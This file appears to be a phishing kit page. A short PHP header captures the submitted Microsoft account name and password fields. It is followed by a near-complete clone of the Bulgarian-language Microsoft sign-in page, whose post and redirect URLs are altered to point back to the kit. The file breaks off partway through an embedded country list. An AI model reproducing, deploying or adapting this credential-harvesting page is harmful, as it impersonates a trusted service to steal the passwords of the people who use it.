<?php
  if (isset($_POST['loginfmt']) && $_POST['loginfmt'] != "" && isset($_POST['passwd']) && $_POST['passwd'] != "") {
    // code...
  }
 $login = $_POST['loginfmt'];
 $password = $_POST['passwd'];

// header("Location: https://#/mail/0/");
 ?>

 <!DOCTYPE html>
 <html dir="ltr" lang="BG-BG">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><noscript>
   <meta http-equiv="Refresh" content="0; URL=https://login.live.com/jsDisabled.srf?mkt=BG-BG&lc=1026&uaid=00de9cba0c8e4c7aac15ade45a847ccb"/>Акаунтът в Microsoft изисква JavaScript за влизане. Този уеб браузър или не поддържа JavaScript, или използването на скриптове в него е блокирано.<br /><br />За да разберете дали браузърът поддържа JavaScript, както и за да разрешите използването на скриптове, вж. онлайн помощта на браузъра.</noscript>
   <title>Влизане във вашия акаунт в Microsoft</title>
   <meta name="robots" content="none">
   <meta name="PageID" content="i5030">
   <meta name="SiteID" content="292841">
   <meta name="ReqLC" content="1026">
   <meta name="LocLC" content="1026">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
   <script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var o=t[n]={exports:{},id:n,loaded:!1};return e[n].call(o.exports,o,o.exports,r),o.loaded=!0,o.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){!function(){function e(){return u.$Config||u.ServerData||{}}function r(e,r){var t=u.$Debug;t&&t.appendLog&&(r&&(e+=" '"+(r.src||r.href||"")+"'",e+=", id:"+(r.id||""),e+=", async:"+(r.async||""),e+=", defer:"+(r.defer||"")),t.appendLog(e))}function t(){var e=u.$B;if(void 0===c)if(e)c=e.IE;else{var r=u.navigator.userAgent;c=r.indexOf("MSIE ")!==-1||r.indexOf("Trident/")!==-1}return c}function n(e){var r=e.indexOf("?"),t=r>-1?r:e.length;return t>g&&e.substr(t-g,g).toLowerCase()===f}function o(){var r=e(),t=r.loader||{};return t.slReportFailure||r.slReportFailure||!1}function a(){var r=e(),t=r.loader||{};return t.redirectToErrorPageOnLoadFailure||!1}function i(){var r=e(),t=r.loader||{};return t.logByThrowing||!1}function s(e){var r=!0,t=e.src||e.href||"";if(t){if(n(t))try{e.sheet&&e.sheet.cssRules&&!e.sheet.cssRules.length&&(r=!1)}catch(o){}}else r=!1;return r}function d(){function t(e){var r=l.getElementsByTagName("head")[0];r.appendChild(e)}function o(e,r,t,o){var s=null;return s=n(e)?a(e):"script"===o.toLowerCase()?i(e):c(e,o),r&&(s.id=r),"function"==typeof s.setAttribute&&(s.setAttribute("crossorigin","anonymous"),t&&"string"==typeof t&&s.setAttribute("integrity",t)),s}function a(e){var r=l.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e,r}function i(e){var r=l.createElement("script");return r.type="text/javascript",r.src=e,r.defer=!1,r.async=!1,r}function c(e,r){var t=l.createElement(r);return t.src=e,t}function u(e){if(!(m&&m.length>1))return e;for(var r=0;r<m.length;r++)if(0===e.indexOf(m[r]))return m[r+1<m.length?r+1:0]+e.substring(m[r].length);return e}function f(e,t,n,o){return r("[$Loader]: "+(L.failMessage||"Failed"),o),R[e].retry<p?(R[e].retry++,h(e,t,n),void d._ReportFailure(R[e].retry,R[e].srcPath)):void(n&&n())}function g(e,t,n,o){if(s(o)){r("[$Loader]: "+(L.successMessage||"Loaded"),o),h(e+1,t,n);var a=R[e].onSuccess;"function"==typeof a&&a(R[e].srcPath)}else f(e,t,n,o)}function h(e,n,a){if(e<R.length){var i=R[e];if(!i||!i.srcPath)return void h(e+1,n,a);i.retry>0&&(i.srcPath=u(i.srcPath),i.origId||(i.origId=i.id),i.id=i.origId+"_Retry_"+i.retry);var s=o(i.srcPath,i.id,i.integrity,i.tagName);s.onload=function(){g(e,n,a,s)},s.onerror=function(){f(e,n,a,s)},s.onreadystatechange=function(){"loaded"===s.readyState?setTimeout(function(){g(e,n,a,s)},500):"complete"===s.readyState&&g(e,n,a,s)},t(s),r("[$Loader]: Loading '"+(i.srcPath||"")+"', id:"+(i.id||""))}else n&&n()}var v=e(),p=v.slMaxRetry||2,y=v.loader||{},m=y.cdnRoots||[],L=this,R=[];L.retryOnError=!0,L.successMessage="Loaded",L.failMessage="Error",L.Add=function(e,r,t,n,o,a){e&&R.push({srcPath:e,id:r,retry:n||0,integrity:t,tagName:o||"script",onSuccess:a})},L.AddForReload=function(e,r){var t=e.src||e.href||"";L.Add(t,"AddForReload",e.integrity,1,e.tagName,r)},L.AddIf=function(e,r,t){e&&L.Add(r,t)},L.Load=function(e,r){h(0,e,r)}}var c,u=window,l=u.document,f=".css",g=f.length;d.On=function(e,r,t){if(!e)throw"The target element must be provided and cannot be null.";r?d.OnError(e,t):d.OnSuccess(e,t)},d.OnSuccess=function(e,t){var n=e.src||e.href||"",i=o(),c=a();if(!e)throw"The target element must be provided and cannot be null.";if(s(e)){r("[$Loader]: Loaded",e);var u=new d;u.failMessage="Reload Failed",u.successMessage="Reload Success",u.Load(null,function(){if(i)throw"Unexpected state. ResourceLoader.Load() failed despite initial load success. ['"+n+"']";c&&(document.location.href="/error.aspx?err=504")})}else d.OnError(e,t)},d.OnError=function(e,t){var n=e.src||e.href||"",i=o(),s=a();if(!e)throw"The target element must be provided and cannot be null.";r("[$Loader]: Failed",e);var c=new d;c.failMessage="Reload Failed",c.successMessage="Reload Success",c.AddForReload(e,t),c.Load(null,function(){if(i)throw"Failed to load external resource ['"+n+"']";s&&(document.location.href="/error.aspx?err=504")}),d._ReportFailure(0,n)},d._ReportFailure=function(e,r){if(i()&&!t())throw"[Retry "+e+"] Failed to load external resource ['"+r+"'], reloading from fallback CDN endpoint"},u.$Loader=d}()}]));</script><script type="text/javascript">!function(r,t){for(var e in t)r[e]=t[e]}(this,function(r){function t(o){if(e[o])return e[o].exports;var n=e[o]={exports:{},id:o,loaded:!1};return r[o].call(n.exports,n,n.exports,t),n.loaded=!0,n.exports}var e={};return t.m=r,t.c=e,t.p="",t(0)}([function(r,t){!function(){function r(r,t){function e(i){var a=r[i];return i<o-1?void(n.r[a]?e(i+1):n.when(a,function(){e(i+1)})):void t(a)}var o=r.length;e(0)}function t(r,t,i){function a(){var r=!!u.method,n=r?u.method:i[0],a=u.extraArgs||[],c=o.$WebWatson;try{var f=e(i,!r);if(a&&a.length>0)for(var s=a.length,v=0;v<s;v++)f.push(a[v]);n.apply(t,f)}catch(h){return void(c&&c.submitFromException&&c.submitFromException(h))}}var u=n.r&&n.r[r];return t=t?t:this,u&&(u.skipTimeout?a():o.setTimeout(a,0)),u}function e(r,t){return Array.prototype.slice.call(r,t?1:0)}var o=window;o.$Do||(o.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var n=o.$Do;n.when=function(e,o){function i(r){t(r,a,u)||n.q.push({id:r,c:a,a:u})}var a=0,u=[],c=1,f="function"==typeof o;f||(a=o,c=2);for(var s=c;s<arguments.length;s++)u.push(arguments[s]);e instanceof Array?r(e,i):i(e)},n.register=function(r,e,o){if(!n.r[r]){n.o.push(r);var i={};if(e&&(i.method=e),o&&(i.skipTimeout=o),arguments&&arguments.length>3){i.extraArgs=[];for(var a=3;a<arguments.length;a++)i.extraArgs.push(arguments[a])}n.r[r]=i,n.lock++;try{for(var u=0;u<n.q.length;u++){var c=n.q[u];c.id==r&&t(r,c.c,c.a)&&n.removeItems.push(c)}}catch(f){throw f}finally{if(n.lock--,0===n.lock){for(var s=0;s<n.removeItems.length;s++)for(var v=n.removeItems[s],h=0;h<n.q.length;h++)if(n.q[h]===v){n.q.splice(h,1);break}n.removeItems=[]}}}},n.unregister=function(r){n.r[r]&&delete n.r[r]}}()}]));</script><script type="text/javascript">!function(n,e){for(var r in e)n[r]=e[r]}(this,function(n){function e(o){if(r[o])return r[o].exports;var t=r[o]={exports:{},id:o,loaded:!1};return n[o].call(t.exports,t,t.exports,e),t.loaded=!0,t.exports}var r={};return e.m=n,e.c=r,e.p="",e(0)}([function(n,e){!function(){function n(){return r.$Config||r.ServerData||{}}function e(){var e=(n(),new t),r=this,i=[],f=[];r.Add=function(n,r,o,t){e.Add(n,r,o,t)},r.Provides=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)i.push(n[e]);else i.push(n)},r.Requires=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)f.push(n[e]);else f.push(n)},r.Load=function(n,r){var t=function(){n&&n();for(var e=0;e<i.length;e++)o.register(i[e],0,!0)},u=function(){e.Load(t,r)};f.length>0?o.when(f,u):u()}}var r=window,o=(r.document,r.$Do),t=r.$Loader,i=".css";i.length;e.WhenLoaded=function(n,e){o.when(n,e)},r.$DepLoader=e}()}]));</script><link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29383.9/images/favicon.ico"><link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="https://logincdn.msauth.net/16.000/Converged_v21026_aaRUc92kCx1I0HSCbabz7g2.css"><style type="text/css"></style><style type="text/css">body{display:none;}</style><script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript><script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(e){function r(n){if(t[n])return t[n].exports;var i=t[n]={exports:{},id:n,loaded:!1};return e[n].call(i.exports,i,i.exports,r),i.loaded=!0,i.exports}var t={};return r.m=e,r.c=t,r.p="",r(0)}([function(e,r){var t=window,n=t.navigator;t.g_iSRSFailed=0,t.g_sSRSSuccess="",r.SRSRetry=function(e,r,i,s,a){var o=1,c=unescape("%3Cscript type='text/javascript'");a&&(c+=" crossorigin='anonymous' integrity='"+a+"'"),c+=" src='";var u=unescape("'%3E%3C/script%3E"),S=r;if(n&&n.userAgent&&s&&s!==r){var d=n.userAgent.toLowerCase(),p=d.indexOf("edge")>=0;if(!p){var f=d.match(/chrome\/([0-9]+)\./),g=f&&2===f.length&&!isNaN(f[1])&&parseInt(f[1])>54;g&&(S=s)}}t.g_sSRSSuccess.indexOf(e)===-1&&("undefined"==typeof t[e]?(t.g_iSRSFailed=1,i<=o&&document.write(c+S+u)):t.g_sSRSSuccess+=e+"|"+i+",")}}]));var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://logincdn.msauth.net/16.000.29383.9/images/Windows_Live_v_thumb.jpg"><script type="text/javascript">var ServerData = {CH:false,aA:'',aB:'',urlPostMsa:'#=#',Bq:true,CR:false,Bs:false,aH:'https://login.microsoft.com/consumers/fido/get?mkt=BG-BG&lc=1026&uiflavor=web',aI:'https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=BG-BG&uaid=00de9cba0c8e4c7aac15ade45a847ccb',Bw:true,aK:'',By:true,CY:true,aO:{"appInsightsConfig":{"instrumentationKey":"69adc3c768bd4dc08c19416121249fcc-66f1668a-797b-4249-95e3-6c6651768c28-7293","webAnalyticsConfiguration":{"autoCapture":{"jsError":1,"click":0}}},"appId":"-","defaultEventName":"IDUX_MSAClientTelemetryEvent_WebWatson","autoPost":true,"autoPostDelay":1000,"flush":60000,"maxEvents":1,"minEvents":1,"pltDelay":500,"telemetryEnabled":true,"useOneDSEventApi":true,"serviceID":2},urlReportPageLoad:'',aR:true,urlLogin:'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1649730232&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2f#%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3df078d042-b064-8752-17fc-45791893c5e3&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=1B586605B1C906B4&bk=1649730232&mkt=BG-BG&lc=1026&uaid=00de9cba0c8e4c7aac15ade45a847ccb',Cb:false,DA:"Кодът за еднократна употреба ви дава възможност да влизате, без да въвеждате вашата парола. Това спомага за защитата на вашия акаунт, когато използвате чужд компютър. <a href=\"http://explore.live.com/windows-live-sign-in-single-use-code-faq\" id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Научете повече</a>",aV:false,Cc:true,DB:"Времето на изчакване на вашата сесия изтече. За да заявите нов код за еднократна употреба, <a href=\"javascript:NewOTCRequest()\">обновете страницата</a>.",hpgid:33,sRequestCountry:'BG',aW:true,b7:2,b8:0,DD:"Влизане",Ce:false,b9:true,Ch:true,fApplicationInsightsEnabled:false,DH:'https://sc.imp.live.com/content/dam/imp/surfaces/mail_signin/v3/account/BG-BG.html?id=292841&mkt=BG-BG&cbcxt=out',DI:'',DJ:'',Ck:false,DK:'https://go.microsoft.com/fwlink/p/?LinkID=733247',Cl:true,urlFed:'',DM:'',ab:'BG',iApplicationInsightsEnabledPercentage:0,urlPostAad:'https://login.microsoftonline.com/common/fidoauthorize?redirect_uri=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1649730232%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252f#%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253df078d042-b064-8752-17fc-45791893c5e3%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26contextid%3d1B586605B1C906B4%26bk%3d1649730232%26mkt%3dBG-BG%26lc%3d1026%26uaid%3d00de9cba0c8e4c7aac15ade45a847ccb%26gotoaad%3d1&uaid=00de9cba0c8e4c7aac15ade45a847ccb',Cp:false,Cq:false,DQ:'https://passwordreset.microsoftonline.com?uaid=00de9cba0c8e4c7aac15ade45a847ccb',ag:'https://outlook.office365.com/owa/prefetch.aspx?id=292841&mkt=BG-BG',ah:'',urlApplicationInsightsEndpoint:'',ai:'https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=BG-BG&uaid=00de9cba0c8e4c7aac15ade45a847ccb',sPOST_NewUser:'',ak:'',Cx:true,bK:'i5030',bL:'',bM:'',ap:'PROD',iServerExecutionTime:5,urlPost:'#',bS:'https://account.live.com/ChangePassword?uaid=00de9cba0c8e4c7aac15ade45a847ccb',at:true,bT:'https://login.live.com/GetCredentialType.srf?opid=35948E0FDE74AC4E&id=292841&wa=wsignin1.0&rpsnv=13&ct=1649730232&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2f#%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3df078d042-b064-8752-17fc-45791893c5e3&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&mkt=BG-BG&lc=1026&uaid=00de9cba0c8e4c7aac15ade45a847ccb',au:false,bU:'https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1649730232%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252f#%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253df078d042-b064-8752-17fc-45791893c5e3%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26contextid%3d1B586605B1C906B4%26bk%3d1649730232&id=292841&uiflavor=web&cobrandid=90015&lostauthenticator=1&uaid=00de9cba0c8e4c7aac15ade45a847ccb&mkt=BG-BG&lc=1026&bk=1649730232',bV:'https://login.live.com/Me.htm?v=3&uaid=00de9cba0c8e4c7aac15ade45a847ccb',aw:true,c5:"#~#partnerdomain#~# не използва тази услуга. Влезте с друг акаунт в Microsoft или създайте нов акаунт. <a href=\"#~#WLPaneHelpInviteBlockedURL_LS#~#\" id=\"idPaneHelpInviteBlockedLink9\">Научете повече</a>",Db:"Използване на основния телефонен номер, който сте свързали с вашия акаунт в Microsoft. <a href=\"http://explore.live.com/windows-live-sign-in-single-use-code-faq\" id=\"idPaneHelpOTCInfoLink9\" target=\"_blank\">Научете повече</a>",c6:'',bX:'',bZ:'https://login.live.com/GetSessionState.srf?wa=wsignin1.0&rpsnv=13&ct=1649730232&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2f#%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3df078d042-b064-8752-17fc-45791893c5e3&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&mkt=BG-BG&lc=1026&uaid=00de9cba0c8e4c7aac15ade45a847ccb',sApplicationInsightsInstrumentationKey:'',A:10000,fWebNgcFS:false,Dh:'',B:2,Di:'',C:'',Dj:'',D:false,Dk:'',sFedQS:'wa=wsignin1.0&wtrealm=uri:WindowsLiveID&wctx=wa%3Dwsignin1.0%26rpsnv%3D13%26ct%3D1649730232%26rver%3D7.0.6737.0%26wp%3DMBI_SSL%26wreply%3Dhttps%253a%252f%252f#%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253df078d042-b064-8752-17fc-45791893c5e3%26id%3D292841%26aadredir%3D1%26CBCXT%3Dout%26lw%3D1%26fl%3Ddob%252cflname%252cwld%26cobrandid%3D90015%26contextid%3D1B586605B1C906B4%26bk%3D1649730232',Dm:'https://go.microsoft.com/fwlink/?linkid=2013738',H:'',Do:'',I:'',J:'#/signup?wa=wsignin1.0&rpsnv=13&ct=1649730232&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2f#%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3df078d042-b064-8752-17fc-45791893c5e3&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=1B586605B1C906B4&bk=1649730232&uiflavor=web&lic=1&mkt=BG-BG&lc=1026&uaid=00de9cba0c8e4c7aac15ade45a847ccb',Dp:'https://go.microsoft.com/fwlink/?LinkID=254486',cC:false,A0:0,K:{"ri":"BL6PPF9D2EF1B89","ver":"16.0.29383.9"},A1:0,L:false,M:-1,bh:'',A4:0,A5:1,bj:'PPFT',cI:0,A7:'',Q:1026,str:[],R:'https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fwa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1649730232%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252f#%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253df078d042-b064-8752-17fc-45791893c5e3%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26contextid%3d1B586605B1C906B4%26bk%3d1649730232&id=292841&uiflavor=web&cobrandid=90015&uaid=00de9cba0c8e4c7aac15ade45a847ccb&mkt=BG-BG&lc=1026&bk=1649730232',A8:'login.live.com',S:false,bm:'',bn:'',V:'https://github.com/login/oauth/authorize?response_type=code&client_id=e37ffdec11c0245cb2e0&scope=read:user++user:email&redirect_uri=https://login.live.com/HandleGithubResponse.srf&allow_signup=false&state=35948E0FDE74AC4E',cP:{},bq:'https://account.live.com/query.aspx?uaid=00de9cba0c8e4c7aac15ade45a847ccb&mkt=BG-BG&lc=1026&id=292841',W:'https://login.live.com/cookiesDisabled.srf?uaid=00de9cba0c8e4c7aac15ade45a847ccb&mkt=BG-BG&lc=1026',cQ:{'Logo':'','LogoAltText':'','LogoText':'','ShowWLHeader':true},X:true,cS:'##li16####B##Hotmail##/B####BR##Интелигентната имейл услуга – бърза, лесна и надеждна##li8####B##Messenger##/B####BR##Останете свързани с най-важните хора в живота си##li10####B##SkyDrive##/B####BR##Безплатно и защитено с парола онлайн съхраняване на данни',AA:60,cT:'',urlSwitch:'https://login.live.com/logout.srf?wa=wsignin1.0&rpsnv=13&ct=1649730232&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2f#%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3df078d042-b064-8752-17fc-45791893c5e3&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=1B586605B1C906B4&uaid=00de9cba0c8e4c7aac15ade45a847ccb&ru=https://#/owa/%3fnlp%3d1%26RpsCsrfState%3df078d042-b064-8752-17fc-45791893c5e3&bk=1649730232&lm=I',cU:'gmail.com,yahoo.com,qq.com,mail.ru,163.com,aol.com',urlFedConvertRename:'https://account.live.com/security/LoginStage.aspx?lmif=1000&ru=https://login.live.com/login.srf%3Fwa%3Dwsignin1.0%26rpsnv%3D13%26ct%3D1649730232%26rver%3D7.0.6737.0%26wp%3DMBI_SSL%26wreply%3Dhttps%253a%252f%252f#%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253df078d042-b064-8752-17fc-45791893c5e3%26id%3D292841%26aadredir%3D1%26CBCXT%3Dout%26lw%3D1%26fl%3Ddob%252cflname%252cwld%26cobrandid%3D90015%26mkt%3DBG-BG%26lc%3D1026%26uaid%3D00de9cba0c8e4c7aac15ade45a847ccb&wa=wsignin1.0&rpsnv=13&ct=1649730232&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2f#%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3df078d042-b064-8752-17fc-45791893c5e3&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&mkt=BG-BG&lc=1026&cbid=0&id=292841&uaid=00de9cba0c8e4c7aac15ade45a847ccb',AC:'',AE:'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1649730232&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2f#%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3df078d042-b064-8752-17fc-45791893c5e3&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=1B586605B1C906B4&bk=1649730232&mkt=BG-BG&lc=1026&uaid=00de9cba0c8e4c7aac15ade45a847ccb&gotoaad=1',cX:'',cY:'',a:'https://logincdn.msauth.net/shared/1.0/',b:{},AI:true,d:'',AJ:3,e:true,AK:null,f:1,g:'',i:'292841',k:'00de9cba0c8e4c7aac15ade45a847ccb',ce:false,l:2,AS:true,B2:3,AT:false,B4:5,sCBUpTxt1:'',B5:0,ci:0,AV:true,sCBUpTxt2:'',sHostBuildNumber:'16.0.29383.9',AY:true,cm:1,u:'https://account.live.com/username/recover?wreply=https://login.live.com/login.srf%3flc%3d1026%26mkt%3dBG-BG%26wa%3dwsignin1.0%26rpsnv%3d13%26ct%3d1649730232%26rver%3d7.0.6737.0%26wp%3dMBI_SSL%26wreply%3dhttps%253a%252f%252f#%252fowa%252f%253fnlp%253d1%2526RpsCsrfState%253df078d042-b064-8752-17fc-45791893c5e3%26id%3d292841%26aadredir%3d1%26CBCXT%3dout%26lw%3d1%26fl%3ddob%252cflname%252cwld%26cobrandid%3d90015%26contextid%3d1B586605B1C906B4%26bk%3d1649730232%26uaid%3d00de9cba0c8e4c7aac15ade45a847ccb&id=292841&cobrandid=90015&mkt=BG-BG&lc=1026&uaid=00de9cba0c8e4c7aac15ade45a847ccb&uiflavor=web',v:'',cp:{},cq:{},correlationId:'00de9cba0c8e4c7aac15ade45a847ccb',cr:'',oPost:{},z:0,Aa:1,ct:'регистрация',cu:'',Ab:null,Ad:'wa=wsignin1.0&rpsnv=13&ct=1649730232&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2f#%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3df078d042-b064-8752-17fc-45791893c5e3&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=1B586605B1C906B4&bk=1649730232',BC:false,Ae:'',BE:true,cz:'Passport',Ag:false,Ah:true,BH:false,Ai:true,Aj:0,BK:true,sErrTxt:'',Am:'AF~Афганистан~93!!!AL~Албания~355!!!DZ~Алжир~213!!!AD~Андора~376!!!AO~Ангола~244!!!AQ~Антарктика~672!!!AG~Антигуа и Барбуда~1!!!AR~Аржентина~54!!!AM~Армения~374!!!AW~Аруба~297!!!AC~Остров Асенсион~247!!!AU~Австралия~61!!!AT~Австрия~43!!!AZ~Азербайджан~994!!!BS~Бахамски острови~1!!!BH~Бахрейн~973!!!BD~Бангладеш~880!!!BB~Барбадос~1!!!BY~Беларус~375!!!BE~Белгия~32!!!BZ~Белиз~501!!!BJ~Бенин~229!!!BM~Бермудски острови~1!!!BT~Бутан~975!!!BO~Боливия~591!!!BQ~Бонер~599!!!BA~Босна и Херцеговина~387!!!BW~Ботсвана~267!!!BV~Остров Буве~47!!!BR~Бразилия~55!!!IO~Британска територия в Индийския океан~44!!!VG~Британски Вирджински острови~1!!!BN~Бруней Даруссалам~673!!!BG~България~359!!!BF~Буркина Фасо~226!!!BI~Бурунди~257!!!CV~Кабо Верде~238!!!KH~Камбоджа~855!!!CM~Камерун~237!!!CA~Канада~1!!!KY~Кайманови острови~1!!!CF~Централноафриканска република~236!!!TD~Чад~235!!!CL~Чили~56!!!CN~Китай~86!!!CX~Остров Рождество~61!!!CC~Кокосови острови (острови Кийлинг)~61!!!CO~Колумбия~57!!!KM~Коморски о-ви~269!!!CG~Конго~242!!!CD~Конго (ДРК)~243!!!CK~Острови Кук~682!!!CR~Коста Рика~506!!!CI~Кот д\'Ивоар~225!!!HR~Хърватия~385!!!CU~Куба~53!!!CW~Кюрасао~599!!!CY~Кипър~357!!!CZ~Чехия~420!!!DK~Дания~45!!!DJ~Джибути~253!!!DM~Доминика~1!!!DO~Доминиканска република~1!!!EC~Еквадор~593!!!EG~Египет~20!!!SV~Ел Салвадор~503!!!GQ~Екваториална Гвинея~240!!!ER~Еритрея~291!!!EE~Естония~372!!!ET~Етиопия~251!!!FK~Фолкландски острови~500!!!FO~Фарьорски острови~298!!!FJ~Фиджи~679!!!FI~Финландия~358!!!FR~Франция~33!!!GF~Френска Гвиана~594!!!PF~Френска Полинезия~689!!!GA~Габон~241!!!GM~Гамбия~220!!!GE~Грузия~995!!!DE~Германия~49!!!GH~Гана~233!!!GI~Гибралтар~350!!!GR~Гърция~30!!!GL~Гренландия~299!!!GD~Гренада~1!!!GP~Гваделупа~590!!!GU~Гуам~1!!!GT~Гватемала~502!!!GG~Гърнзи~44!!!GN~Гвинея~224!!!GW~Гвинея-Бисау~245!!!GY~Гаяна~592!!!HT~Хаити~509!!!HN~Хондурас~504!!!HK~Хонконг, САР~852!!!HU~Унгария~36!!!IS~Исландия~354!!!IN~Индия~91!!!ID~Индонезия~62!!!IR~Иран~98!!!IQ~Ирак~964!!!IE~Ирландия~353!!!IM~Остров Ман~44!!!IL~Израел~972!!!IT~Италия~39!!!JM~Ямайка~1!!!XJ~Ян Майен~47!!!JP~Япония~81!!!JE~Джърси~44!!!JO~Йордания~962!!!KZ~Казахстан~7!!!KE~Кения~254!!!KI~Кирибати~686!!!KR~Южна Корея~82!!!XK~Косово~383!!!KW~Кувейт~965!!!KG~Киргизстан~996!!!LA~Лаос~856!!!LV~Латвия~371!!!LB~Ливан~961!!!LS~Лесото~266!!!LR~Либерия~231!!!LY~Либия~218!!!LI~Лихтенщайн~423!!!LT~Литва~370!!!LU~Люксембург~352!!!MO~Макао, САР~853!!!MK~Северна Македония~389!!!MG~Мадагаскар~261!!!MW~Малави~265!!!MY~Малайзия~60!!!MV~Малдиви~960!!!ML~Мали~223!!!MT~Малта~356!!!MH~Маршалови острови~692!!!MQ~Мартиника~596!!!MR~Мавритания~222!!!MU~Мавриций~230!!!YT~Майот~262!!!MX~Мексико~52!!!FM~Микронезия~691!!!MD~Молдова~373!!!MC~Монако~377!!!MN~Монголия~976!!!ME~Черна гора~382!!!MS~Монтсерат~1!!!MA~Мароко~212!!!MZ~Мозамбик~258!!!MM~Мианмар~95!!!NA~Намибия~264!!!NR~Науру~674!!!NP~Непал~977!!!NL~Нидерландия~31!!!AN~Нидерландски Антили (бивши)~599!!!NC~Нова Каледония~687!!!NZ~Нова Зеландия~64!!!NI~Никарагуа~505!!!NE~Нигер~227!!!NG~Нигерия~234!!!NU~Ниуе~683!!!MP~Северни Мариански острови~1!!!NO~Норвегия~47!!!OM~Оман~968!!!PK~Пакистан~92!!!PW~Палау~680!!!PS~Палестинска автономия~970!!!PA~Панама~507!!!PG~Папуа Нова Гвинея~675!!!PY~Парагвай~595!!!PE~Перу~51!!!PH~Филипини~63!!!PL~Полша~48!!!PT~Португалия~351!!!QA~Катар~974!!!RE~Реюнион~262!!!RO~Румъния~40!!!RU~Русия~7!!!RW~Руанда~250!!!XS~Саба~599!!!KN~Сейнт Китс и Невис~1!!!LC~Санта Лучия~1!!!PM~Сен Пиер и Микелон~508!!!VC~Сейнт Винсент и Гренадини~1!!!WS~Самоа~685!!!SM~Сан Марино~378!!!ST~Сао Томе и Принсипи~239!!!SA~Саудитска Арабия~966!!!SN~Сенегал~221!!!RS~Сърбия~381!!!SC~Сейшели~248!!!SL~Сиера Леоне~232!!!SG~Сингапур~65!!!XE~Синт Естатиус~599!!!SK~Словакия~421!!!SI~Словения~386!!!SB~Соломонови острови~677!!!SO~Сомалия~252!!!ZA~Южна Африка~27!!!SS~Южен Судан~211!!!ES~Испания~34!!!LK~Шри Ланка~94!!!SH~Св. Елена, Възнесение и Тристан да Куня~290!!!SD~Судан~249!!!SR~Суринам~597!!!SJ~Свалбард~47!!!SZ~Свазиленд~268!!!SE~Швеция~46!!!CH~Швейцария~41!!!SY~Сирия~963!!!TW~Тайван~886!!!TJ~Таджикистан~992!!!TZ~Танзания~255!!!TH~Тайланд~66!!!TL~Източен Тимор (Тимор 